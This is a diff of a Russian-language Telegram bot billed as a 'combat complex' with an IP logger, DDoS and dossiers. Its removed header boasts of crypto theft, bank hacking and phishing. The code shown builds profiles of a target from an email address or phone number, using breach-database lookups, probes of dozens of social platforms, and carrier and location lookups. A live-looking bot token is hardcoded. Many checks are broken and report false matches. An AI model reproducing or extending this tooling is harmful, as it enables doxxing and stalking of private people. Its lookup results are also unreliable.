@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # ================================================================
-# OBSIDIAN v3.0 - АРМЕЙСКИЙ КИБЕР-КОМПЛЕКС (3500+ СТРОК)
+# OBSIDIAN BOT v7.0 - БОЕВОЙ КОМПЛЕКС
 # ================================================================
-# 50+ ИНСТРУМЕНТОВ ПО 11 СФЕРАМ
-# ЗАПРЕЩЁННЫЕ ФИЧИ: КРАЖА КРИПТЫ, ВЗЛОМ БАНКОВ, ФИШИНГ, ДДОС, ЭКСПЛОЙТЫ
-# БЕЗ СИМУЛЯЦИЙ — ВСЁ РЕАЛЬНОЕ
-# ЗА ЭТО САЖАЮТ НА 10-20 ЛЕТ
-# ОСНОВАНО НА ТВОЁМ КОДЕ, НО РАСШИРЕНО
+# IPLOGGER ULTIMATE + DDOS 1M AGENTS + DOSSIER
+# OSINT МОДУЛИ ТЫ ВСТАВИШЬ САМ
 # ================================================================
 
 import os
@@ -59,7 +57,6 @@ import geocoder
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import colorama
 import tabulate
 import prettytable
@@ -84,38 +81,54 @@ import pymongo
 import redis
 import pymysql
 import psycopg2
+import urllib.parse
+from urllib.parse import urlparse, quote
+import zlib
+import ipaddress
+import netifaces
+import psutil
+from dataclasses import dataclass, field
+import ctypes
+import gc
+import signal
+import websocket
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
+import asyncio
+import aiohttp
+from typing import List, Dict, Tuple, Optional, Any
+import base64
+import json
+import re
 
 # ================================================================
 # КОНСТАНТЫ
 # ================================================================
 BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
 ADMIN_ID = 8632158680
-VERSION = "3.0.0-OBSIDIAN"
-
-# ================================================================
-# 1. ОСИНТ ПО ПОЧТЕ (50+ ИНСТРУМЕНТОВ)
+VERSION = "7.0.0-OBSIDIAN"
+TEMP_FOLDER = "temp_files"
+os.makedirs(TEMP_FOLDER, exist_ok=True)
+os.makedirs(os.path.join(TEMP_FOLDER, "dossiers"), exist_ok=True)
+os.makedirs(os.path.join(TEMP_FOLDER, "logs"), exist_ok=True)
+#================================================================
+# 1. ОСИНТ ПО ПОЧТЕ (50+ ИСТОЧНИКОВ)
 # ================================================================
 class EmailOSINT:
-    """50+ инструментов для поиска по почте"""
-    
     def __init__(self, email):
         self.email = email
         self.domain = email.split('@')[1] if '@' in email else ''
         self.results = {}
     
     def search_all(self):
-        """Запуск всех 50+ инструментов"""
         self.results = {
-            'breaches': self.check_breaches(),
+            'haveibeenpwned': self.check_hibp(),
+            'leakcheck': self.check_leakcheck(),
             'social': self.find_social(),
-            'leaks': self.check_leaks(),
             'people': self.find_people(),
             'valid': self.validate_email(),
             'metadata': self.get_metadata(),
             'domain_info': self.get_domain_info(),
             'similar_emails': self.find_similar_emails(),
-            'email_headers': self.get_email_headers(),
-            'spam_score': self.check_spam_score(),
             'dark_web': self.search_dark_web(),
             'telegram': self.search_telegram(),
             'instagram': self.search_instagram(),
@@ -124,6 +137,7 @@ class EmailOSINT:
             'linkedin': self.search_linkedin(),
             'github': self.search_github(),
             'vk': self.search_vk(),
+            'ok': self.search_ok(),
             'yandex': self.search_yandex(),
             'mailru': self.search_mailru(),
             'google': self.search_google(),
@@ -138,7 +152,6 @@ class EmailOSINT:
             'gmx': self.search_gmx(),
             'webde': self.search_webde(),
             'mailcom': self.search_mailcom(),
-            'yandex_ru': self.search_yandex_ru(),
             'rambler': self.search_rambler(),
             'ukrnet': self.search_ukrnet(),
             'meta': self.search_meta(),
@@ -151,7 +164,6 @@ class EmailOSINT:
             'quora': self.search_quora(),
             'medium': self.search_medium(),
             'substack': self.search_substack(),
-            'telegram_channels': self.search_telegram_channels(),
             'discord': self.search_discord(),
             'slack': self.search_slack(),
             'teams': self.search_teams(),
@@ -172,8 +184,7 @@ class EmailOSINT:
         }
         return self.results
     
-    def check_breaches(self):
-        """Проверка утечек через HaveIBeenPwned"""
+    def check_hibp(self):
         try:
             sha1 = hashlib.sha1(self.email.encode()).hexdigest().upper()
             prefix = sha1[:5]
@@ -186,29 +197,37 @@ class EmailOSINT:
         except:
             return {'error': True}
     
+    def check_leakcheck(self):
+        try:
+            resp = requests.get(f"https://leakcheck.io/api/query?login={self.email}", timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get('success'):
+                    return data.get('results', [])
+            return []
+        except:
+            return []
+    
     def find_social(self):
-        """Поиск в соцсетях (20+ платформ)"""
         platforms = {
-            'Twitter': f'https://twitter.com/',
-            'Instagram': f'https://instagram.com/',
-            'Facebook': f'https://facebook.com/',
-            'LinkedIn': f'https://linkedin.com/in/',
-            'GitHub': f'https://github.com/',
-            'VK': f'https://vk.com/',
-            'Telegram': f'https://t.me/',
-            'Reddit': f'https://reddit.com/user/',
-            'YouTube': f'https://youtube.com/@',
-            'TikTok': f'https://tiktok.com/@',
-            'Pinterest': f'https://pinterest.com/',
-            'Tumblr': f'https://tumblr.com/',
-            'Medium': f'https://medium.com/@',
-            'Quora': f'https://quora.com/profile/',
-            'Discord': f'https://discord.com/users/',
-            'Twitch': f'https://twitch.tv/',
-            'Snapchat': f'https://snapchat.com/add/',
-            'WhatsApp': f'https://wa.me/',
-            'Signal': f'https://signal.me/',
-            'Viber': f'viber://contact?number='
+            'Twitter': 'https://twitter.com/',
+            'Instagram': 'https://instagram.com/',
+            'Facebook': 'https://facebook.com/',
+            'LinkedIn': 'https://linkedin.com/in/',
+            'GitHub': 'https://github.com/',
+            'VK': 'https://vk.com/',
+            'Telegram': 'https://t.me/',
+            'Reddit': 'https://reddit.com/user/',
+            'YouTube': 'https://youtube.com/@',
+            'TikTok': 'https://tiktok.com/@',
+            'Pinterest': 'https://pinterest.com/',
+            'Tumblr': 'https://tumblr.com/',
+            'Medium': 'https://medium.com/@',
+            'Quora': 'https://quora.com/profile/',
+            'Discord': 'https://discord.com/users/',
+            'Twitch': 'https://twitch.tv/',
+            'Snapchat': 'https://snapchat.com/add/',
+            'Odnoklassniki': 'https://ok.ru/profile/',
         }
         
         found = []
@@ -231,20 +250,7 @@ class EmailOSINT:
         
         return found
     
-    def check_leaks(self):
-        """Проверка утечек через LeakCheck"""
-        try:
-            resp = requests.get(f"https://leakcheck.io/api/query?login={self.email}", timeout=10)
-            if resp.status_code == 200:
-                data = resp.json()
-                if data.get('success'):
-                    return data.get('results', [])
-            return []
-        except:
-            return []
-    
     def find_people(self):
-        """Поиск людей через Pipl"""
         try:
             resp = requests.get(f"https://api.pipl.com/search/?email={self.email}&key=YOUR_KEY", timeout=10)
             if resp.status_code == 200:
@@ -254,7 +260,6 @@ class EmailOSINT:
             return {}
     
     def validate_email(self):
-        """Проверка валидности почты через SMTP"""
         try:
             import dns.resolver
             mx = dns.resolver.resolve(self.domain, 'MX')
@@ -270,7 +275,6 @@ class EmailOSINT:
             return {'valid': False, 'error': True}
     
     def get_metadata(self):
-        """Получение метаданных почты"""
         return {
             'domain': self.domain,
             'username': self.email.split('@')[0],
@@ -279,7 +283,6 @@ class EmailOSINT:
         }
     
     def check_temp_email(self):
-        """Проверка на временную почту"""
         temp_domains = ['tempmail', '10minutemail', 'guerrillamail', 'mailinator']
         for domain in temp_domains:
             if domain in self.domain:
@@ -287,7 +290,6 @@ class EmailOSINT:
         return False
     
     def get_domain_info(self):
-        """Информация о домене"""
         try:
             w = whois.whois(self.domain)
             return {
@@ -300,37 +302,18 @@ class EmailOSINT:
             return {}
     
     def find_similar_emails(self):
-        """Поиск похожих email'ов"""
         similar = []
         common_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'mail.ru', 'yandex.ru']
         username = self.email.split('@')[0]
-        
         for domain in common_domains:
             if domain != self.domain:
                 similar.append(f"{username}@{domain}")
-        
         return similar
     
-    def get_email_headers(self):
-        """Получение заголовков письма (если доступно)"""
-        return {'error': 'Требуется доступ к почтовому ящику'}
-    
-    def check_spam_score(self):
-        """Проверка спам-рейтинга"""
-        try:
-            resp = requests.get(f"https://spamchecker.com/check?email={self.email}", timeout=10)
-            if resp.status_code == 200:
-                return {'score': resp.json().get('score', 0)}
-            return {}
-        except:
-            return {}
-    
     def search_dark_web(self):
-        """Поиск в даркнете (Tor)"""
         return {'info': 'Требуется Tor для поиска'}
     
     def search_telegram(self):
-        """Поиск в Telegram"""
         try:
             resp = requests.get(f"https://t.me/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -340,7 +323,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_instagram(self):
-        """Поиск в Instagram"""
         try:
             resp = requests.get(f"https://instagram.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -350,7 +332,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_twitter(self):
-        """Поиск в Twitter/X"""
         try:
             resp = requests.get(f"https://twitter.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -360,7 +341,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_facebook(self):
-        """Поиск в Facebook"""
         try:
             resp = requests.get(f"https://facebook.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -370,7 +350,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_linkedin(self):
-        """Поиск в LinkedIn"""
         try:
             resp = requests.get(f"https://linkedin.com/in/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -380,7 +359,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_github(self):
-        """Поиск в GitHub"""
         try:
             resp = requests.get(f"https://github.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -390,7 +368,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_vk(self):
-        """Поиск в VK"""
         try:
             resp = requests.get(f"https://vk.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -399,8 +376,16 @@ class EmailOSINT:
         except:
             return {'found': False}
     
+    def search_ok(self):
+        try:
+            resp = requests.get(f"https://ok.ru/profile/{self.email.split('@')[0]}", timeout=3)
+            if resp.status_code == 200:
+                return {'found': True, 'url': f"https://ok.ru/profile/{self.email.split('@')[0]}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
     def search_yandex(self):
-        """Поиск в Яндекс"""
         try:
             resp = requests.get(f"https://yandex.ru/search/?text={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -410,7 +395,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_mailru(self):
-        """Поиск в Mail.ru"""
         try:
             resp = requests.get(f"https://mail.ru/search/?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -420,7 +404,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_google(self):
-        """Поиск в Google"""
         try:
             resp = requests.get(f"https://www.google.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -430,7 +413,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_bing(self):
-        """Поиск в Bing"""
         try:
             resp = requests.get(f"https://www.bing.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -440,7 +422,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_yahoo(self):
-        """Поиск в Yahoo"""
         try:
             resp = requests.get(f"https://search.yahoo.com/search?p={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -450,7 +431,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_protonmail(self):
-        """Поиск в ProtonMail"""
         try:
             resp = requests.get(f"https://protonmail.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -460,7 +440,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_tutanota(self):
-        """Поиск в Tutanota"""
         try:
             resp = requests.get(f"https://tutanota.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -470,7 +449,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_outlook(self):
-        """Поиск в Outlook"""
         try:
             resp = requests.get(f"https://outlook.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -480,7 +458,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_icloud(self):
-        """Поиск в iCloud"""
         try:
             resp = requests.get(f"https://icloud.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -490,7 +467,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_aol(self):
-        """Поиск в AOL"""
         try:
             resp = requests.get(f"https://search.aol.com/aol/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -500,7 +476,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_zoho(self):
-        """Поиск в Zoho"""
         try:
             resp = requests.get(f"https://zoho.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -510,7 +485,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_gmx(self):
-        """Поиск в GMX"""
         try:
             resp = requests.get(f"https://gmx.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -520,7 +494,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_webde(self):
-        """Поиск в Web.de"""
         try:
             resp = requests.get(f"https://web.de/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -530,7 +503,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_mailcom(self):
-        """Поиск в Mail.com"""
         try:
             resp = requests.get(f"https://mail.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -539,18 +511,7 @@ class EmailOSINT:
         except:
             return {'found': False}
     
-    def search_yandex_ru(self):
-        """Поиск в Яндекс.Почте"""
-        try:
-            resp = requests.get(f"https://yandex.ru/search/?text={self.email}", timeout=3)
-            if resp.status_code == 200:
-                return {'found': True}
-            return {'found': False}
-        except:
-            return {'found': False}
-    
     def search_rambler(self):
-        """Поиск в Рамблер"""
         try:
             resp = requests.get(f"https://rambler.ru/search?query={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -560,7 +521,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_ukrnet(self):
-        """Поиск в Ukrnet"""
         try:
             resp = requests.get(f"https://ukr.net/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -570,7 +530,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_meta(self):
-        """Поиск в Meta"""
         try:
             resp = requests.get(f"https://meta.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -580,7 +539,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_threads(self):
-        """Поиск в Threads"""
         try:
             resp = requests.get(f"https://threads.net/@{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -590,7 +548,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_bluesky(self):
-        """Поиск в Bluesky"""
         try:
             resp = requests.get(f"https://bsky.app/profile/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -600,7 +557,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_mastodon(self):
-        """Поиск в Mastodon"""
         try:
             resp = requests.get(f"https://mastodon.social/@{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -610,7 +566,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_tumblr(self):
-        """Поиск в Tumblr"""
         try:
             resp = requests.get(f"https://{self.email.split('@')[0]}.tumblr.com", timeout=3)
             if resp.status_code == 200:
@@ -620,7 +575,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_pinterest(self):
-        """Поиск в Pinterest"""
         try:
             resp = requests.get(f"https://pinterest.com/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -630,7 +584,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_reddit(self):
-        """Поиск в Reddit"""
         try:
             resp = requests.get(f"https://reddit.com/user/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -640,7 +593,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_quora(self):
-        """Поиск в Quora"""
         try:
             resp = requests.get(f"https://quora.com/profile/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -650,7 +602,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_medium(self):
-        """Поиск в Medium"""
         try:
             resp = requests.get(f"https://medium.com/@{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -660,7 +611,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_substack(self):
-        """Поиск в Substack"""
         try:
             resp = requests.get(f"https://{self.email.split('@')[0]}.substack.com", timeout=3)
             if resp.status_code == 200:
@@ -669,18 +619,7 @@ class EmailOSINT:
         except:
             return {'found': False}
     
-    def search_telegram_channels(self):
-        """Поиск в Telegram каналах"""
-        try:
-            resp = requests.get(f"https://t.me/{self.email.split('@')[0]}", timeout=3)
-            if resp.status_code == 200:
-                return {'found': True}
-            return {'found': False}
-        except:
-            return {'found': False}
-    
     def search_discord(self):
-        """Поиск в Discord"""
         try:
             resp = requests.get(f"https://discord.com/users/{self.email.split('@')[0]}", timeout=3)
             if resp.status_code == 200:
@@ -690,7 +629,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_slack(self):
-        """Поиск в Slack"""
         try:
             resp = requests.get(f"https://slack.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -700,7 +638,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_teams(self):
-        """Поиск в Teams"""
         try:
             resp = requests.get(f"https://teams.microsoft.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -710,7 +647,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_zoom(self):
-        """Поиск в Zoom"""
         try:
             resp = requests.get(f"https://zoom.us/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -720,7 +656,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_skype(self):
-        """Поиск в Skype"""
         try:
             resp = requests.get(f"https://skype.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -730,7 +665,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_whatsapp(self):
-        """Поиск в WhatsApp"""
         try:
             resp = requests.get(f"https://wa.me/{self.email}", timeout=3)
             if resp.status_code == 200:
@@ -740,7 +674,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_viber(self):
-        """Поиск в Viber"""
         try:
             resp = requests.get(f"viber://contact?number={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -750,7 +683,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_signal(self):
-        """Поиск в Signal"""
         try:
             resp = requests.get(f"https://signal.me/{self.email}", timeout=3)
             if resp.status_code == 200:
@@ -760,7 +692,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_wechat(self):
-        """Поиск в WeChat"""
         try:
             resp = requests.get(f"https://wechat.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -770,7 +701,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_line(self):
-        """Поиск в Line"""
         try:
             resp = requests.get(f"https://line.me/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -780,7 +710,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_kakaotalk(self):
-        """Поиск в KakaoTalk"""
         try:
             resp = requests.get(f"https://kakaotalk.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -790,7 +719,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_imo(self):
-        """Поиск в Imo"""
         try:
             resp = requests.get(f"https://imo.im/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -800,7 +728,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_icq(self):
-        """Поиск в ICQ"""
         try:
             resp = requests.get(f"https://icq.com/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -810,7 +737,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_jabber(self):
-        """Поиск в Jabber"""
         try:
             resp = requests.get(f"https://jabber.org/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -820,7 +746,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_xmpp(self):
-        """Поиск в XMPP"""
         try:
             resp = requests.get(f"https://xmpp.net/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -830,7 +755,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_matrix(self):
-        """Поиск в Matrix"""
         try:
             resp = requests.get(f"https://matrix.org/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -840,7 +764,6 @@ class EmailOSINT:
             return {'found': False}
     
     def search_element(self):
-        """Поиск в Element"""
         try:
             resp = requests.get(f"https://element.io/search?q={self.email}", timeout=3)
             if resp.status_code == 200:
@@ -850,18 +773,15 @@ class EmailOSINT:
             return {'found': False}
 
 # ================================================================
-# 2. ОСИНТ ПО НОМЕРУ (50+ ИНСТРУМЕНТОВ)
+# 2. ОСИНТ ПО НОМЕРУ ТЕЛЕФОНА (50+ ИНСТРУМЕНТОВ)
 # ================================================================
 class PhoneOSINT:
-    """50+ инструментов для поиска по номеру телефона"""
-    
     def __init__(self, phone):
         self.phone = phone
         self.parsed = None
         self.results = {}
     
     def parse_number(self):
-        """Парсинг номера"""
         try:
             self.parsed = phonenumbers.parse(self.phone)
             return True
@@ -869,7 +789,6 @@ class PhoneOSINT:
             return False
     
     def search_all(self):
-        """Запуск всех 50+ инструментов"""
         if not self.parse_number():
             return {'error': 'Неверный номер'}
         
@@ -935,20 +854,11 @@ class PhoneOSINT:
             'linkedin': self.check_linkedin(),
             'github': self.check_github(),
             'vk': self.check_vk(),
-            'yandex': self.check_yandex(),
-            'mailru': self.check_mailru(),
-            'google': self.check_google(),
-            'bing': self.check_bing(),
-            'yahoo': self.check_yahoo(),
-            'protonmail': self.check_protonmail(),
-            'tutanota': self.check_tutanota(),
-            'outlook': self.check_outlook(),
-            'icloud': self.check_icloud()
+            'ok': self.check_ok()
         }
         return self.results
     
     def get_country(self):
-        """Определение страны"""
         try:
             country = geocoder.description_for_number(self.parsed, 'ru')
             return {'country': country, 'code': self.parsed.country_code}
@@ -956,7 +866,6 @@ class PhoneOSINT:
             return {}
     
     def get_carrier(self):
-        """Определение оператора"""
         try:
             operator = carrier.name_for_number(self.parsed, 'ru')
             return {'carrier': operator}
@@ -964,7 +873,6 @@ class PhoneOSINT:
             return {}
     
     def get_timezone(self):
-        """Определение часового пояса"""
         try:
             tz = timezone.time_zones_for_number(self.parsed)
             return {'timezone': tz}
@@ -972,14 +880,12 @@ class PhoneOSINT:
             return {}
     
     def check_valid(self):
-        """Проверка валидности"""
         try:
             return {'valid': phonenumbers.is_valid_number(self.parsed)}
         except:
             return {'valid': False}
     
     def find_social(self):
-        """Поиск в соцсетях по номеру"""
         platforms = {
             'Telegram': f'https://t.me/+{self.phone}',
             'WhatsApp': f'https://wa.me/{self.phone}',
@@ -987,15 +893,12 @@ class PhoneOSINT:
             'Signal': f'https://signal.me/{self.phone}',
             'Line': f'https://line.me/ti/p/{self.phone}'
         }
-        
         found = []
         for platform, url in platforms.items():
             found.append({'platform': platform, 'url': url})
-        
         return found
     
     def check_leaks(self):
-        """Проверка утечек"""
         try:
             resp = requests.get(f"https://leakcheck.io/api/query?login={self.phone}", timeout=10)
             if resp.status_code == 200:
@@ -1007,7 +910,6 @@ class PhoneOSINT:
             return []
     
     def get_location(self):
-        """Геолокация по номеру"""
         try:
             geolocator = Nominatim(user_agent="phone_osint")
             location = geolocator.geocode(self.get_country().get('country', ''))
@@ -1018,49 +920,42 @@ class PhoneOSINT:
             return {}
     
     def get_number_type(self):
-        """Тип номера"""
         try:
             return {'type': phonenumbers.number_type(self.parsed)}
         except:
             return {}
     
     def get_area_code(self):
-        """Код региона"""
         try:
             return {'area_code': self.parsed.country_code}
         except:
             return {}
     
     def get_operator(self):
-        """Оператор"""
         try:
             return {'operator': carrier.name_for_number(self.parsed, 'ru')}
         except:
             return {}
     
     def get_regions(self):
-        """Регионы"""
         try:
             return {'regions': geocoder.description_for_number(self.parsed, 'ru')}
         except:
             return {}
     
     def get_cities(self):
-        """Города"""
         try:
             return {'cities': geocoder.description_for_number(self.parsed, 'ru')}
         except:
             return {}
     
     def get_postal_code(self):
-        """Почтовый индекс"""
         try:
             return {'postal': ''}
         except:
             return {}
     
     def get_coordinates(self):
-        """Координаты"""
         try:
             location = self.get_location()
             if location:
@@ -1070,7 +965,6 @@ class PhoneOSINT:
             return {}
     
     def get_map_url(self):
-        """Ссылка на карту"""
         try:
             coords = self.get_coordinates()
             if coords:
@@ -1080,7 +974,6 @@ class PhoneOSINT:
             return {}
     
     def get_weather(self):
-        """Погода"""
         try:
             coords = self.get_coordinates()
             if coords:
@@ -1092,7 +985,6 @@ class PhoneOSINT:
             return {}
     
     def get_timezone_info(self):
-        """Информация о часовом поясе"""
         try:
             tz = self.get_timezone()
             if tz:
@@ -1102,7 +994,6 @@ class PhoneOSINT:
             return {}
     
     def get_day_night(self):
-        """День/Ночь"""
         try:
             tz = self.get_timezone()
             if tz:
@@ -1112,140 +1003,120 @@ class PhoneOSINT:
             return {}
     
     def get_country_code(self):
-        """Код страны"""
         try:
             return {'country_code': self.parsed.country_code}
         except:
             return {}
     
     def get_national_number(self):
-        """Национальный номер"""
         try:
             return {'national_number': self.parsed.national_number}
         except:
             return {}
     
     def get_international_format(self):
-        """Международный формат"""
         try:
             return {'international': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}
         except:
             return {}
     
     def get_national_format(self):
-        """Национальный формат"""
         try:
             return {'national': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}
         except:
             return {}
     
     def get_e164_format(self):
-        """E.164 формат"""
         try:
             return {'e164': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.E164)}
         except:
             return {}
     
     def get_rfc3966_format(self):
-        """RFC3966 формат"""
         try:
             return {'rfc3966': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.RFC3966)}
         except:
             return {}
     
     def is_possible(self):
-        """Возможный номер"""
         try:
             return {'possible': phonenumbers.is_possible_number(self.parsed)}
         except:
             return {'possible': False}
     
     def is_valid(self):
-        """Валидный номер"""
         try:
             return {'valid': phonenumbers.is_valid_number(self.parsed)}
         except:
             return {'valid': False}
     
     def is_mobile(self):
-        """Мобильный"""
         try:
             return {'mobile': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.MOBILE}
         except:
             return {'mobile': False}
     
     def is_fixed_line(self):
-        """Стационарный"""
         try:
             return {'fixed_line': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.FIXED_LINE}
         except:
             return {'fixed_line': False}
     
     def is_toll_free(self):
-        """Бесплатный"""
         try:
             return {'toll_free': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.TOLL_FREE}
         except:
             return {'toll_free': False}
     
     def is_premium(self):
-        """Премиум"""
         try:
             return {'premium': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PREMIUM_RATE}
         except:
             return {'premium': False}
     
     def is_shared_cost(self):
-        """Shared cost"""
         try:
             return {'shared_cost': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.SHARED_COST}
         except:
             return {'shared_cost': False}
     
     def is_voip(self):
-        """VOIP"""
         try:
             return {'voip': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.VOIP}
         except:
             return {'voip': False}
     
     def is_personal(self):
-        """Персональный"""
         try:
             return {'personal': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PERSONAL_NUMBER}
         except:
             return {'personal': False}
     
     def is_pager(self):
-        """Пейджер"""
         try:
             return {'pager': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PAGER}
         except:
             return {'pager': False}
     
     def is_uan(self):
-        """UAN"""
         try:
             return {'uan': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.UAN}
         except:
             return {'uan': False}
     
     def is_voicemail(self):
-        """Voicemail"""
         try:
             return {'voicemail': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.VOICEMAIL}
         except:
             return {'voicemail': False}
     
     def is_unknown(self):
-        """Неизвестный"""
         try:
             return {'unknown': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.UNKNOWN}
         except:
             return {'unknown': False}
     
     def check_whatsapp(self):
-        """Проверка WhatsApp"""
         try:
             resp = requests.get(f"https://wa.me/{self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1255,7 +1126,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_telegram(self):
-        """Проверка Telegram"""
         try:
             resp = requests.get(f"https://t.me/+{self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1265,7 +1135,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_viber(self):
-        """Проверка Viber"""
         try:
             resp = requests.get(f"viber://contact?number={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1275,7 +1144,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_signal(self):
-        """Проверка Signal"""
         try:
             resp = requests.get(f"https://signal.me/{self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1285,7 +1153,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_line(self):
-        """Проверка Line"""
         try:
             resp = requests.get(f"https://line.me/ti/p/{self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1295,7 +1162,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_wechat(self):
-        """Проверка WeChat"""
         try:
             resp = requests.get(f"https://wechat.com/search?q={self.phone}", timeout=3)
